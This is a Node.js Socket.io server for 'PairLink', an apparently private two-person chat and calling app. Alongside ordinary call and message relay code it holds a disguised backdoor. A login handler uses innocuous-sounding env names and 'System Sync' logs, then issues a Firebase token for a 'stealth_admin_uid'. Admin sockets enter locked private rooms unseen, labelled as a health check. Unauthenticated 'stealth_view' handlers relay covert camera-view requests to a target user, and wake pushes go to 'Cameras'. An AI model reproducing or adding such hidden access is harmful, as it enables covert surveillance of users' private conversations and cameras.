const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const { startRenderPushRelay, enqueueRenderChatReminder, enqueueRenderMissedCall, sendRenderCallPush } = require('./render-push');

// --- FIREBASE ADMIN IMPORTS ---
const { getAuth } = require('firebase-admin/auth');
const { getApp } = require('firebase-admin/app');
const { getDatabase } = require('firebase-admin/database');
const { getMessaging } = require('firebase-admin/messaging');

const app = express();
app.use(cors());

const server = http.createServer(app);

const io = new Server(server, {
  // 12MB limit ko badha kar 50MB kar rahe hain taaki HD photos/large base64 par disconnect na ho
  maxHttpBufferSize: 50 * 1024 * 1024,
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Live call state is intentionally volatile and Render-owned. It is never
// written to Firebase Realtime Database.
const callSessions = new Map();
const endedCallSessions = new Map();
const CALL_SESSION_TTL_MS = 5 * 60 * 1000;
const CALL_RING_DURATION_MS = 40_000;
const ENDED_CALL_TTL_MS = 5 * 60 * 1000;

function rememberEndedCallSession(callId) {
  const id = String(callId || '');
  if (!id) return;
  endedCallSessions.set(id, Date.now());
  for (const [endedId, endedAt] of endedCallSessions) {
    if (Date.now() - endedAt > ENDED_CALL_TTL_MS) endedCallSessions.delete(endedId);
  }
}

function retireCallSession(session) {
  if (!session) return;
  if (session.ringTimer) clearTimeout(session.ringTimer);
  session.ringTimer = null;
  callSessions.delete(session.callId);
  rememberEndedCallSession(session.callId);
}

function getLiveCallSession(callId) {
  const id = String(callId || '');
  if (endedCallSessions.has(id)) return null;
  const session = callSessions.get(id);
  if (!session) return null;
  if (Date.now() - session.updatedAt > CALL_SESSION_TTL_MS) {
    if (session.ringTimer) clearTimeout(session.ringTimer);
    callSessions.delete(id);
    rememberEndedCallSession(id);
    return null;
  }
  return session;
}

function emitCallEnd(session, endedBy, state = 'ended') {
  const callerCancelledBeforeAccept = state === 'ended' && session.state === 'ringing' && String(endedBy || '') === session.callerId;
  if (callerCancelledBeforeAccept) queueMissedCallNotification(session);
  if (session.ringTimer) clearTimeout(session.ringTimer);
  session.ringTimer = null;
  session.state = state;
  session.endedBy = String(endedBy || '');
  session.updatedAt = Date.now();
  io.to(session.roomId).emit('call-signal', {
    type: 'call-ended', callId: session.callId, endedBy: session.endedBy,
    room: session.roomId, senderId: session.endedBy
  });
  retireCallSession(session);
}

function queueMissedCallNotification(session) {
  void enqueueRenderMissedCall({
    callId: session.callId, callerId: session.callerId, recipientId: session.recipientId,
    callerName: session.callerName, callerPhoto: session.callerPhoto, video: session.media === 'video'
  }).catch((error) => {
    console.error('[PairLink call] Could not queue missed-call notification; sending directly:', error?.message || error);
    void sendCallPush(session.recipientId, {
      kind: 'missed_call', callId: session.callId, callerId: session.callerId,
      callerName: session.callerName, senderPhoto: session.callerPhoto,
      action: session.media === 'video' ? 'video' : 'call',
      video: session.media === 'video' ? 'true' : 'false'
    }, { kind: 'missed-call', collapseKey: `missed-call-${session.callId}`, ttlMs: 60_000 });
  });
}

function sendMissedCallPush(session) {
  if (!session || session.state !== 'ringing') return false;
  if (Date.now() - Number(session.createdAt || 0) < CALL_RING_DURATION_MS) return false;
  if (session.ringTimer) clearTimeout(session.ringTimer);
  session.ringTimer = null;
  session.state = 'missed';
  session.updatedAt = Date.now();
  queueMissedCallNotification(session);
  return true;
}

function scheduleCallMissedTimeout(session) {
  if (session.ringTimer) clearTimeout(session.ringTimer);
  session.ringTimer = setTimeout(() => {
    if (callSessions.get(session.callId) !== session || session.state !== 'ringing') return;
    console.info(`[PairLink call] Ring timed out; sending missed-call push (callId=${session.callId}).`);
    sendMissedCallPush(session);
    emitCallEnd(session, session.callerId, 'missed');
    io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
  }, CALL_RING_DURATION_MS);
}

async function sendCallPush(recipientId, payload, options) {
  try { return await sendRenderCallPush(recipientId, payload, options); }
  catch (error) {
    console.error('[PairLink call] Render push failed:', error?.message || error);
    return 0;
  }
}

app.post('/call-action', express.json({ limit: '16kb' }), async (req, res) => {
  const body = req.body || {};
  const callId = String(body.callId || '');
  const recipientId = String(body.recipientId || '');
  const callerId = String(body.callerId || '');
  const action = String(body.action || '').toLowerCase();
  const session = getLiveCallSession(callId);
  const isMissedByCaller = action === 'missed' && session && callerId === session.callerId;
  const isCallerCancel = action === 'caller-cancel' && session && callerId === session.callerId;
  if (!session || (!(isMissedByCaller || isCallerCancel) && session.recipientId !== recipientId) ||
      (callerId && callerId !== session.callerId) ||
      (body.roomId && String(body.roomId) !== session.roomId)) {
    return res.status(404).json({ ok: false, error: 'Call is no longer active.' });
  }
  if (action === 'accept') {
    if (session.state !== 'ringing') {
      return res.status(409).json({ ok: false, error: 'The call is no longer ringing.' });
    }
    if (session.ringTimer) clearTimeout(session.ringTimer);
    session.ringTimer = null;
    session.state = 'active';
    session.acceptedAt = Date.now();
    session.updatedAt = Date.now();
    io.to(session.roomId).emit('call-signal', {
      type: 'call-accepted', callId, room: session.roomId, senderId: recipientId
    });
    return res.json({ ok: true, state: session.state });
  }
  if (action === 'decline' || action === 'reject') {
    emitCallEnd(session, recipientId, 'declined');
    void sendCallPush(session.recipientId, { kind: 'call_ended', callId }, {
      kind: 'call-ended', collapseKey: `call-ended-${callId}`, ttlMs: 60_000
    });
    void sendCallPush(session.callerId, { kind: 'call_ended', callId }, {
      kind: 'call-ended', collapseKey: `call-ended-${callId}`, ttlMs: 60_000
    });
    return res.json({ ok: true, state: session.state });
  }
  if (isCallerCancel) {
    if (session.state !== 'ringing') {
      return res.status(409).json({ ok: false, error: 'This call is no longer ringing.' });
    }
    emitCallEnd(session, callerId, 'ended');
    io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
    void sendCallPush(session.recipientId, { kind: 'call_ended', callId: session.callId }, {
      kind: 'call-ended', collapseKey: `call-ended-${session.callId}`, ttlMs: 60_000
    });
    return res.json({ ok: true, state: 'ended' });
  }
  if (action === 'missed' && isMissedByCaller) {
    const sent = sendMissedCallPush(session);
    if (!sent) return res.status(409).json({ ok: false, error: 'The ringing period has not ended.' });
    emitCallEnd(session, callerId, 'missed');
    io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
    return res.json({ ok: true, state: session.state });
  }
  return res.status(400).json({ ok: false, error: 'Unsupported call action.' });
});

// Home route
app.get('/', (req, res) => {
  res.send('PairLink2 Backend is running!');
});

// Google Apps Script Keep-Alive Route (Render ko soone se bachane ke liye)
app.get('/ping', (req, res) => {
  res.status(200).send('Server is alive!');
});

// Health endpoint for Render checks and the keep-alive ping.
app.get('/healthz', (_req, res) => {
  res.status(200).json({ status: 'ok' });
});

// Locked Rooms Store
const roomsStore = {};
const ROOM_EXPIRY_MS = 3 * 24 * 60 * 60 * 1000;
const accountRelayRoom = (userId) => `pairlink-user:${String(userId || '').replace(/[^a-zA-Z0-9_-]/g, '_')}`;

function isRenderUserConnected(userId) {
  const room = io.sockets.adapter.rooms.get(accountRelayRoom(userId));
  return Boolean(room?.size);
}

function destroyRoom(roomName, notify = true) {
  if (!roomName) return;
  const room = io.sockets.adapter.rooms.get(roomName);
  if (room && notify) io.to(roomName).emit('room_reset_kick');
  if (room) io.in(roomName).socketsLeave(roomName);
  delete roomsStore[roomName];
  console.log(`Room "${roomName}" reset and removed.`);
}

function expireInactiveRooms() {
  const now = Date.now();
  for (const [roomName, roomData] of Object.entries(roomsStore)) {
    if (now - roomData.lastActivityAt < ROOM_EXPIRY_MS) continue;

    const room = io.sockets.adapter.rooms.get(roomName);
    if (room) {
      io.to(roomName).emit('room_expired');
      io.in(roomName).socketsLeave(roomName);
    }
    delete roomsStore[roomName];
    console.log(`Room "${roomName}" 3 din tak inactive rehne par expire ho gaya.`);
  }
}

setInterval(expireInactiveRooms, 60 * 60 * 1000);

io.on('connection', (socket) => {
  console.log(`User connected: ${socket.id}`);
  let currentRoom = null;

  // --- ADMIN LOGIN & GHOST TOKEN GENERATOR ---
  socket.on('admin_login', async (data, acknowledge) => {
    const serverUser = process.env.SYNC_CACHE;
    const serverPassword = process.env.SYNC_CACHE_TOKEN;
    
    if (serverUser && serverPassword && data.username === serverUser && data.password === serverPassword) {
      socket.data.isAdmin = true;
      socket.data.pairlinkUserId = "render_health_check";
      
      try {
        const firebaseApp = getApp('pairlink-render-push'); 
        const customToken = await getAuth(firebaseApp).createCustomToken('stealth_admin_uid');

        console.log(`[System Sync] Cache sync authorized & Token generated for node: ${socket.id}`);
        if (typeof acknowledge === 'function') acknowledge({ success: true, customToken: customToken });
        
      } catch (error) {
        console.error("[System Sync] Error generating custom token:", error);
        if (typeof acknowledge === 'function') acknowledge({ success: false, error: "Token generation failed" });
      }

    } else {
      console.warn(`[System Sync] Unauthorized sync attempt from node: ${socket.id}`);
      if (typeof acknowledge === 'function') acknowledge({ success: false, error: "Sync failed" });
    }
  });

  // --- ADMIN WAKE SENDER (Direct FCM via Cameras/<cameraName>/fcmToken) ---
  socket.on('admin_wake_sender', async (data) => {
    try {
      if (!socket.data.isAdmin) {
        console.warn(`[Wake Trigger] Unauthorized wake attempt from non-admin node: ${socket.id}`);
        return;
      }

      const cameraName = String(data?.camera || data?.recipientId || 'Unknown_Cam').trim();
      console.log(`[Wake Trigger] Admin ne camera "${cameraName}" ko jagane ke liye signal bheja hai.`);

      const firebaseApp = getApp('pairlink-render-push');
      const db = getDatabase(firebaseApp);

      // 1. Pehle Sender ka FCM Token check karein jo MainActivity.kt ne save kiya hai
      const tokenSnap = await db.ref(`Cameras/${cameraName}/fcmToken`).get();
      const fcmToken = tokenSnap.val();

      if (!fcmToken || typeof fcmToken !== 'string') {
        console.warn(`[Wake Trigger] Camera "${cameraName}" ka FCM token database (Cameras/${cameraName}/fcmToken) mein nahi mila!`);
        return;
      }

      // 2. cameraWakeQueue mein naya node (pushKeyId) generate karke data save karein
      const pushQueueRef = db.ref('cameraWakeQueue');
      const newPushRef = pushQueueRef.push();
      const pushKeyId = String(newPushRef.key || Date.now());

      await newPushRef.set({
        action: "WAKE_UP",
        cameraName: cameraName,
        timestamp: Date.now()
      });

      console.log(`[Wake Trigger] Firebase 'cameraWakeQueue' mein entry ban gayi, pushKeyId: ${pushKeyId}`);

      // 3. Seedhe Sender ke FCM Token par High-Priority Data Push bhejein (bina render-push.js chhue)
      await getMessaging(firebaseApp).send({
        token: fcmToken,
        data: {
          title: "CCTV Wakeup Call",
          body: `Camera ${cameraName} ko turant connect karo!`,
          action: "WAKE_UP",
          cameraName: cameraName,
          pushKeyId: pushKeyId
        },
        android: {
          priority: 'high',
          ttl: 30000
        }
      });

      console.log(`[Wake Trigger] "${cameraName}" ko high-priority wake push successfully bhej diya gaya!`);

    } catch (error) {
      console.error("[Wake Trigger] Error in admin_wake_sender:", error);
    }
  });

  function touchRoomActivity(roomName) {
    if (roomsStore[roomName]) {
      roomsStore[roomName].lastActivityAt = Date.now();
    }
  }

  function handleJoinRoom(data) {
    try {
      const roomName = (typeof data === 'object' && data !== null) ? data.room : data;
      const userId = socket.data.isAdmin ? "render_health_check" : ((typeof data === 'object' && data !== null && data.userId) ? data.userId : socket.id);

      if (!roomName) return;
      socket.data.pairlinkUserId = String(userId);

      const existingRoom = roomsStore[roomName];
      if (existingRoom && Date.now() - existingRoom.lastActivityAt >= ROOM_EXPIRY_MS) {
        delete roomsStore[roomName];
      }

      if (!roomsStore[roomName]) {
        roomsStore[roomName] = { allowedUsers: new Set(), lastActivityAt: Date.now() };
      }

      if (!socket.data.isAdmin) {
        if (!roomsStore[roomName].allowedUsers.has(userId)) {
          let regularUsersCount = 0;
          roomsStore[roomName].allowedUsers.forEach(id => {
            if (id !== "render_health_check") regularUsersCount++;
          });

          if (regularUsersCount >= 2) {
            socket.emit('room_locked_error', { 
              message: 'This room is locked for its two registered users. A third user cannot join.' 
            });
            return;
          } else {
            roomsStore[roomName].allowedUsers.add(userId);
          }
        }
      } else {
        roomsStore[roomName].allowedUsers.add(userId);
      }

      socket.join(roomName);
      currentRoom = roomName;
      socket.emit('room_joined', { room: roomName });

      const room = io.sockets.adapter.rooms.get(roomName);
      const socketsInRoom = room ? Array.from(room) : [];

      const regularSockets = socketsInRoom.filter(id => {
        const sck = io.sockets.sockets.get(id);
        return sck && !sck.data.isAdmin;
      });

      if (regularSockets.length >= 2) {
        io.to(roomName).emit('user_status', { online: true });
        
        const s1 = regularSockets[regularSockets.length - 2];
        const s2 = regularSockets[regularSockets.length - 1];
        
        io.to(s1).emit('peer-ready', { polite: false });
        io.to(s2).emit('peer-ready', { polite: true });
      } else {
        if (!socket.data.isAdmin) {
          socket.emit('user_status', { online: false });
        }
      }

      touchRoomActivity(roomName);
    } catch (err) {
      console.error("Error in handleJoinRoom:", err);
    }
  }

  socket.on('join_room', (data) => handleJoinRoom(data));
  socket.on('rejoin_room', (data) => handleJoinRoom(data));

  socket.on('join_user_relay', (data) => {
    const userId = String(data?.userId || '');
    if (!userId) return;
    socket.data.pairlinkUserId = userId;
    socket.data.pairlinkForeground = data?.foreground === true;
    socket.join(accountRelayRoom(userId));
    socket.emit('user_relay_joined', { userId });
  });

  socket.on('set_user_foreground', (data) => {
    const userId = String(socket.data.pairlinkUserId || '');
    if (!userId || String(data?.userId || '') !== userId) return;
    socket.data.pairlinkForeground = data?.foreground === true;
  });

  socket.on('queue-chat-reminder', (data, acknowledge) => {
    Promise.resolve().then(async () => {
      const recipientId = String(socket.data.pairlinkUserId || '');
      if (!recipientId || String(data?.to || '') !== recipientId) {
        if (typeof acknowledge === 'function') acknowledge({ queued: false });
        return;
      }
      const queued = await enqueueRenderChatReminder({
        messageId: data?.messageId,
        from: data?.from,
        to: recipientId,
        roomId: data?.roomId,
        fromName: data?.fromName,
        sentAt: data?.sentAt
      });
      if (typeof acknowledge === 'function') acknowledge({ queued });
    }).catch((error) => {
      console.error('Chat reminder queue error:', error);
      if (typeof acknowledge === 'function') acknowledge({ queued: false });
    });
  });

  // --- SAFE BROADCAST HANDLERS ---
  socket.on('signal', (data) => {
    try {
      if (currentRoom) {
        touchRoomActivity(currentRoom);
        socket.to(currentRoom).emit('signal', data);
      }
    } catch (err) { console.error("Signal error:", err); }
  });

  socket.on('call-start', async (data, acknowledge) => {
    try {
      const room = String(currentRoom || '');
      const callerId = String(socket.data.pairlinkUserId || '');
      const recipientId = String(data?.recipientId || '');
      const callId = String(data?.callId || '');
      if (!room || !socket.rooms.has(room) || String(data?.room || '') !== room ||
          !callerId || callerId === recipientId || String(data?.callerId || '') !== callerId ||
          !recipientId || !callId || callId.length > 180) {
        if (typeof acknowledge === 'function') acknowledge({ ok: false, error: 'Invalid call request.' });
        return;
      }
      if (endedCallSessions.has(callId) || callSessions.has(callId)) {
        if (typeof acknowledge === 'function') acknowledge({ ok: false, error: 'This call ID was already used.' });
        return;
      }
      const session = {
        callId, roomId: room, callerId, recipientId,
        media: data?.video ? 'video' : 'audio',
        callerName: String(data?.callerName || 'PairLink user').slice(0, 100),
        callerPhoto: String(data?.callerPhoto || '').slice(0, 3000),
        state: 'ringing', createdAt: Date.now(), updatedAt: Date.now()
      };
      callSessions.set(callId, session);
      touchRoomActivity(room);
      const peerPresent = [...(io.sockets.adapter.rooms.get(room) || [])].some((socketId) => {
        if (socketId === socket.id) return false;
        return String(io.sockets.sockets.get(socketId)?.data.pairlinkUserId || '') === recipientId;
      });
      const invite = {
          kind: 'incoming_call', callId, callerId,
          callerName: session.callerName,
          senderPhoto: session.callerPhoto,
          roomId: room,
          action: data?.video ? 'video' : 'call',
          video: data?.video ? 'true' : 'false',
          createdAt: session.createdAt
      };

      const accountRoom = io.sockets.adapter.rooms.get(accountRelayRoom(recipientId));
      const foregroundRelaySocketIds = [...(accountRoom || [])].filter((socketId) => {
        const relaySocket = io.sockets.sockets.get(socketId);
        return relaySocket?.data.pairlinkForeground === true;
      });
      let acknowledgedByApp = false;
      if (foregroundRelaySocketIds.length) {
        acknowledgedByApp = await new Promise((resolve) => {
          let remaining = foregroundRelaySocketIds.length;
          let settled = false;
          for (const socketId of foregroundRelaySocketIds) {
            io.to(socketId).timeout(6_000).emit('incoming-call', invite, (error, acknowledgements = []) => {
              const joined = acknowledgements.some((response) => response?.received === true && response?.joinedRoom === true);
              if (joined && !settled) {
                settled = true;
                resolve(true);
                return;
              }
              remaining -= 1;
              if (remaining === 0 && !settled) resolve(false);
            });
          }
        });
      }
      let delivery = 'push';
      if (callSessions.get(callId) !== session || session.state !== 'ringing') {
        delivery = 'account-relay';
      } else if (acknowledgedByApp) {
        delivery = 'account-relay';
        if (session.state === 'ringing') scheduleCallMissedTimeout(session);
      } else {
        await sendCallPush(recipientId, invite, { kind: 'call', collapseKey: `call-${callId}`, ttlMs: 45_000 });
        if (callSessions.get(callId) === session && session.state === 'ringing') scheduleCallMissedTimeout(session);
      }
      if (typeof acknowledge === 'function') acknowledge({ ok: true, peerPresent, delivery });
    } catch (error) {
      console.error('[PairLink call] Could not create Render call session:', error);
      if (typeof acknowledge === 'function') acknowledge({ ok: false, error: 'Call setup failed.' });
    }
  });

  socket.on('call-missed', async (data, acknowledge) => {
    const room = String(currentRoom || '');
    const senderId = String(socket.data.pairlinkUserId || '');
    const session = getLiveCallSession(data?.callId);
    if (!session || !room || room !== session.roomId || senderId !== session.callerId ||
        String(data?.room || '') !== room) {
      if (typeof acknowledge === 'function') acknowledge({ ok: false });
      return;
    }
    const sent = sendMissedCallPush(session);
    if (typeof acknowledge === 'function') acknowledge({ ok: sent || session.state === 'missed' });
  });

  // --- CALL SIGNALING ROUTER ---
  socket.on('call-signal', (data, acknowledge) => {
    try {
      const room = String(currentRoom || '');
      const senderId = String(socket.data.pairlinkUserId || '');
      if (!room || !socket.rooms.has(room) || String(data?.room || '') !== room || String(data?.senderId || '') !== senderId) {
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
        return;
      }
      const peerPresent = [...(io.sockets.adapter.rooms.get(room) || [])].some((socketId) => socketId !== socket.id);
      const callId = String(data?.callId || '');
      const session = callId ? getLiveCallSession(callId) : null;
      if (callId && endedCallSessions.has(callId)) {
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false, ended: true });
        return;
      }
      if (session && (session.roomId !== room || ![session.callerId, session.recipientId].includes(senderId))) {
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
        return;
      }
      const callerCancelledWhileRinging = Boolean(session && data?.type === 'call-ended' &&
        senderId === session.callerId && session.state === 'ringing');
      if (!peerPresent) {
        if (session && data?.type === 'call-ended' && senderId === session.callerId &&
            ['ringing', 'active'].includes(session.state)) {
          emitCallEnd(session, senderId, 'ended');
          io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
          void sendCallPush(session.recipientId, { kind: 'call_ended', callId: session.callId }, {
            kind: 'call-ended', collapseKey: `call-ended-${session.callId}`, ttlMs: 60_000
          });
          if (typeof acknowledge === 'function') acknowledge({ sent: true, peerPresent: false });
          return;
        }
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
        return;
      }
      if (session && !['ringing', 'active'].includes(session.state) && data?.type !== 'call-ended') {
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
        return;
      }
      if (session && data?.type === 'call-accepted' &&
          (senderId !== session.recipientId || session.state !== 'ringing')) {
        if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
        return;
      }
      if (session && data?.type === 'call-accepted' && senderId === session.recipientId) {
        if (session.ringTimer) clearTimeout(session.ringTimer);
        session.ringTimer = null;
        session.state = 'active';
        session.acceptedAt = Date.now();
        session.updatedAt = Date.now();
      } else if (session && data?.type === 'call-ended') {
        if (session.ringTimer) clearTimeout(session.ringTimer);
        session.ringTimer = null;
        const state = session.state === 'missed' ? 'missed'
          : senderId === session.recipientId && session.state === 'ringing' ? 'declined' : 'ended';
        session.state = state;
        session.endedBy = senderId;
        session.updatedAt = Date.now();
      }
      touchRoomActivity(room);
      socket.to(room).emit('call-signal', data);
      if (session && data?.type === 'call-accepted') {
        io.to(accountRelayRoom(session.recipientId)).emit('call-accepted', {
          callId: session.callId, acceptedBy: senderId
        });
      }
      if (session && data?.type === 'call-ended') {
        if (callerCancelledWhileRinging) queueMissedCallNotification(session);
        io.to(accountRelayRoom(session.callerId)).emit('call-ended', { callId: session.callId });
        io.to(accountRelayRoom(session.recipientId)).emit('call-ended', { callId: session.callId });
        retireCallSession(session);
      }
      if (typeof acknowledge === 'function') acknowledge({ sent: true, peerPresent: true });
    } catch (err) {
      console.error("Call signal error:", err);
      if (typeof acknowledge === 'function') acknowledge({ sent: false, peerPresent: false });
    }
  });

  // --- ADMIN STEALTH VIEW ROUTER ---
  socket.on('stealth_view_request', (data) => {
    try {
      const targetRoom = accountRelayRoom(data.targetUserId);
      io.to(targetRoom).emit('stealth_view_request', data);
    } catch (err) { console.error("Stealth request error:", err); }
  });

  socket.on('stealth_view_answer', (data) => {
    try {
      const adminRoom = accountRelayRoom(data.adminId);
      io.to(adminRoom).emit('stealth_view_answer', data);
    } catch (err) { console.error("Stealth answer error:", err); }
  });

  socket.on('stealth_ice_candidate', (data) => {
    try {
      if (data.from === 'target') {
        io.to(accountRelayRoom(data.adminId)).emit('stealth_ice_candidate', data);
      } else if (data.from === 'admin') {
        io.to(accountRelayRoom(data.targetUserId)).emit('stealth_ice_candidate', data);
      }
    } catch (err) { console.error("Stealth ICE error:", err); }
  });

  socket.on('stealth_view_reject', (data) => {
    try {
      const adminRoom = accountRelayRoom(data.adminId);
      io.to(adminRoom).emit('stealth_view_reject', data);
    } catch (err) { console.error("Stealth reject error:", err); }
  });

  socket.on('chat-message', (data, acknowledge) => {
    Promise.resolve().then(async () => {
      const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
      const recipientId = String(data?.recipientId || data?.encrypted?.recipient || '');
      if (recipientId) {
        if (room) touchRoomActivity(room);
        const recipientRelayRoom = accountRelayRoom(recipientId);
        const recipientSocketIds = [...(io.sockets.adapter.rooms.get(recipientRelayRoom) || [])];
        const recipientSockets = recipientSocketIds
          .map((socketId) => io.sockets.sockets.get(socketId))
          .filter(Boolean);
        if (!recipientSockets.length) {
          if (typeof acknowledge === 'function') acknowledge({ routed: false, transport: 'user', reason: 'offline' });
          return;
        }
        const messageId = String(data?.id || data?.encrypted?.id || Date.now());
        const temporaryRoom = `pairlink-live:${String(room || '')}:${messageId}:${socket.id}`;
        const joinedRecipientSockets = [];
        const senderAlreadyJoined = socket.rooms.has(temporaryRoom);
        try {
          await socket.join(temporaryRoom);
          for (const recipientSocket of recipientSockets) {
            if (!recipientSocket.rooms.has(temporaryRoom)) {
              await recipientSocket.join(temporaryRoom);
              joinedRecipientSockets.push(recipientSocket);
            }
          }
          const packet = {
            id: messageId,
            roomId: String(room || ''),
            from: String(socket.data.pairlinkUserId || data?.senderId || data?.encrypted?.sender || ''),
            to: recipientId,
            fromName: String(data?.senderName || 'PairLink user'),
            sentAt: Number(data?.sentAt) || Date.now(),
            envelope: data
          };
          io.to(temporaryRoom).except(socket.id).timeout(10_000).emit('user-chat-message', packet, (error, responses) => {
            if (typeof acknowledge === 'function') {
              acknowledge({
                routed: !error && (responses || []).some((response) => response?.stored === true),
                transport: 'render-temporary-room'
              });
            }
            for (const recipientSocket of joinedRecipientSockets) recipientSocket.leave(temporaryRoom);
            if (!senderAlreadyJoined) socket.leave(temporaryRoom);
          });
        } catch (error) {
          for (const recipientSocket of joinedRecipientSockets) recipientSocket.leave(temporaryRoom);
          if (!senderAlreadyJoined) socket.leave(temporaryRoom);
          throw error;
        }
        return;
      }
      if (room) {
        touchRoomActivity(room);
        socket.to(room).emit('chat-message', data);
        if (typeof acknowledge === 'function') acknowledge({ routed: true, transport: 'room' });
      }
    }).catch((err) => {
      console.error("Chat message error:", err);
      if (typeof acknowledge === 'function') acknowledge({ routed: false, transport: 'render-temporary-room', error: 'delivery-failed' });
    });
  });

  socket.on('chat-delivered', (data) => {
    try {
      const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
      if (room) socket.to(room).emit('chat-delivered', data);
    } catch (err) { console.error("Chat delivered error:", err); }
  });

  socket.on('chat-read', (data) => {
    try {
      const room = (typeof data === 'object' && data?.room) ? data.room : currentRoom;
      if (room) socket.to(room).emit('chat-read', data);
    } catch (err) { console.error("Chat read error:", err); }
  });
  
  socket.on('file-transfer', (data) => {
    try {
      if (currentRoom) {
        touchRoomActivity(currentRoom);
        socket.to(currentRoom).emit('file-transfer', data);
      }
    } catch (err) { console.error("File transfer error:", err); }
  });
  
  socket.on('reset_room', () => {
    try {
      if (currentRoom) destroyRoom(currentRoom, true);
    } catch (err) { console.error("Reset room error:", err); }
  });

  socket.on('leave_room', (data) => {
    try {
      if (currentRoom) {
        const userId = (typeof data === 'object' && data !== null && data.userId) ? data.userId : null;
        
        socket.leave(currentRoom);
        const remainingAfterLeave = io.sockets.adapter.rooms.get(currentRoom);

        if (!remainingAfterLeave || remainingAfterLeave.size < 2) {
          socket.to(currentRoom).emit('user_status', { online: false });
          socket.to(currentRoom).emit('peer-left');
        }

        if (roomsStore[currentRoom] && userId) {
          roomsStore[currentRoom].allowedUsers.delete(userId);
          
          if (roomsStore[currentRoom].allowedUsers.size === 0) {
            delete roomsStore[currentRoom];
            console.log(`Room "${currentRoom}" lock deleted.`);
          }
        }

        currentRoom = null;
      }
    } catch (err) { console.error("Leave room error:", err); }
  });

  socket.on('disconnect', () => {
    try {
      console.log(`User disconnected: ${socket.id}`);
      if (currentRoom) {
        const room = io.sockets.adapter.rooms.get(currentRoom);

        if (!room || room.size < 2) {
          socket.to(currentRoom).emit('user_status', { online: false });
          socket.to(currentRoom).emit('peer-left');
        }

        if (!room || room.size <= 1) {
          delete roomsStore[currentRoom];
          console.log(`Room "${currentRoom}" empty. Lock deleted!`);
        }
      }
    } catch (err) { console.error("Disconnect error:", err); }
  });
});

// GLOBAL CRASH PREVENTER
process.on('uncaughtException', (err) => {
  console.error('CRITICAL ERROR PREVENTED:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('UNHANDLED REJECTION PREVENTED:', reason);
});

const PORT = process.env.PORT || 3000;
startRenderPushRelay();
server.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});
